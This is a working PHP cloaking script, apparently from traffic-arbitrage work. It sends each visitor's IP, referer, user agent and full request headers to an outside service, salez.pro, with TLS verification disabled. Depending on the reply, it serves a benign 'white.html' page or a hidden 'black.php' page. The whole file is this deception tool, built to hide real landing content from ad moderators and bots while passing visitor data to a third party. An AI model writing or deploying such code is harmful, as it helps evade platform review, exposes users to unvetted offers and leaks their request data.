<?php
$ip = '';
if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
	$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
}
if (isset($_SERVER["HTTP_X_REAL_IP"])) {
	$ip = $_SERVER["HTTP_X_REAL_IP"];
}

if (isset($_SERVER["REMOTE_ADDR"])) {
	$ip = $_SERVER["REMOTE_ADDR"];
}
if (isset($_SERVER["HTTP_CLIENT_IP"])) {
	$ip = $_SERVER["HTTP_CLIENT_IP"];
}

$post['ip'] = $ip;
$post['domain'] = $_SERVER['HTTP_HOST'];
$post['referer'] = @$_SERVER['HTTP_REFERER'];
$post['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
$post['headers'] = json_encode(apache_request_headers());

$curl = curl_init('https://salez.pro/api/check_ip');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_TIMEOUT, 60);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
$json_reqest = curl_exec($curl);
curl_close($curl);
$api_reqest = json_decode($json_reqest);
if (!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0) {
	require_once ('white.html');
} else {
	//расскоментить если льём на поддомен
	//if($_GET) $api_reqest->link .= '?'.http_build_query($_GET);
	//echo '<meta http-equiv="refresh" content="0;'.$api_reqest->link.'">';
	require_once ('black.php');
}